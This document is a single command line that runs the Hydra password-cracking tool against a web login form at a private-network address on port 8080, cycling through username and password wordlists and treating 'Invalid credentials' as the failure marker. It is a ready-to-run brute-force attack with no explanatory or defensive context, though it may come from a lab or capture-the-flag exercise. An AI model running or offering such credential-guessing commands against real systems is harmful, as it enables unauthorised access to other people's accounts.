hydra -L users.txt.1 -P passwords.txt.1 -s 8080 192.168.9.6 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
